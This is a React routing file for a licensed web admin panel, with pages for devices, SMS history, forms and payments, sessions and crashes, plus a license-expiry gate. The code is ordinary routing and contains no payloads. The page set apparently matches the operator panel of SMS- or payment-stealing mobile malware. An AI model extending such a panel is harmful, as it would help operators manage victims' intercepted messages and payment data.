// src/App.tsx
import React from "react";
import { Routes, Route, Navigate, Outlet } from "react-router-dom";

import LoginPage from "./pages/LoginPage";
import DashboardPage from "./pages/DashboardPage";
import DevicesPage from "./pages/DevicesPage";
import DeviceDetailPage from "./pages/DeviceDetailPage";
import SmsHistoryPage from "./pages/SmsHistoryPage";
import FormsPaymentsPage from "./pages/FormsPaymentsPage";
import FavoritesPage from "./pages/FavoritesPage";
import AdminSessionsPage from "./pages/AdminSessionsPage";
import CrashesPage from "./pages/CrashesPage";
import SettingsPage from "./pages/SettingsPage";

import ExpiredPage from "./pages/ExpiredPage";
import LicenseGate from "./routes/LicenseGate";

import Topbar from "./components/layout/Topbar";
import Sidebar from "./components/layout/Sidebar";
import MobileBottomNav from "./components/layout/MobileBottomNav";
import Toast from "./components/ui/Toast";

import { isLoggedIn } from "./services/api/auth";
import { getLicenseSnapshot } from "./utils/license";

type ProtectedProps = React.PropsWithChildren<{ redirectTo?: string }>;

const ProtectedRoute = ({ children, redirectTo = "/login" }: ProtectedProps) => {
  // hard stop: expired => always show expired page
  if (getLicenseSnapshot().isExpired) return <Navigate to="/expired" replace />;

  if (!isLoggedIn()) return <Navigate to={redirectTo} replace />;
  return <>{children}</>;
};

const Layout = () => {
  return (
    <div className="min-h-screen flex bg-gray-50">
      <Sidebar />

      <div className="flex-1 flex flex-col">
        <Topbar />
        <main className="p-4 flex-1 overflow-auto pb-20 md:pb-4">
          <Outlet />
        </main>
        <MobileBottomNav />
      </div>

      <Toast />
    </div>
  );
};

export default function App() {
  const expired = getLicenseSnapshot().isExpired;

  return (
    <LicenseGate>
      <Routes>
        {/* Always accessible */}
        <Route path="/expired" element={<ExpiredPage />} />

        {/* Login: if expired, LicenseGate/Protected will still force /expired */}
        <Route path="/login" element={<LoginPage />} />

        <Route
          path="/"
          element={
            <ProtectedRoute>
              <Layout />
            </ProtectedRoute>
          }
        >
          <Route index element={<DashboardPage />} />
          <Route path="devices" element={<DevicesPage />} />
          <Route path="devices/:deviceId" element={<DeviceDetailPage />} />
          <Route path="sms" element={<SmsHistoryPage />} />
          <Route path="forms" element={<FormsPaymentsPage />} />
          <Route path="favorites" element={<FavoritesPage />} />
          <Route path="sessions" element={<AdminSessionsPage />} />
          <Route path="crashes" element={<CrashesPage />} />
          <Route path="settings" element={<SettingsPage />} />
        </Route>

        {/* Unknown route */}
        <Route path="*" element={<Navigate to={expired ? "/expired" : isLoggedIn() ? "/" : "/login"} replace />} />
      </Routes>
    </LicenseGate>
  );
}